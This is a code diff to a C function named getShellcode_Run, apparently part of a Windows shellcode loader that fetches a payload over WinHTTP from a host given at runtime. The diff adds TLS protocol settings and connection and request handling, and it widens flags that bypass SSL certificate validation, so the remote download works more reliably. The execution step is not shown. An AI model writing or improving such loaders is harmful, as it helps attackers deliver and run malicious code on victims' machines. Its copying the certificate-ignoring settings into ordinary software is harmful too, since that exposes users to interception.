@@ -322,6 +322,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     BOOL bResults = FALSE;
     DWORD dwSize = 0, dwDownloaded = 0;
     LPSTR pszOutBuffer = NULL;
+    DWORD tlsFlags = 0;
 
     wchar_t wHost[100], wResource[100];
     MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, 100);
@@ -351,8 +352,36 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto cleanup;
     }
 
-    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
-    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+    tlsFlags = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
+    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &tlsFlags, sizeof(tlsFlags));
+
+    hConnect = WinHttpConnect(hSession, wHost, atoi(port), 0);
+    if (!hConnect) {
+        char msg[256];
+        sprintf_s(msg, "WinHttpConnect failed with error: %ld\n", GetLastError());
+        OutputDebugStringA(msg);
+        goto cleanup;
+    }
+
+    hRequest = WinHttpOpenRequest(hConnect, L"GET", wResource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        char msg[256];
+        sprintf_s(msg, "WinHttpOpenRequest failed with error: %ld\n", GetLastError());
+        OutputDebugStringA(msg);
+        goto cleanup;
+    }
+
+    // Bypass SSL certificate validation
+    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | 
+                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 
+                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
+                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))) {
+        char msg[256];
+        sprintf_s(msg, "WinHttpSetOption (security flags) failed with error: %ld\n", GetLastError());
+        OutputDebugStringA(msg);
+        goto cleanup;
+    }
 
     bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     if (!bResults) {
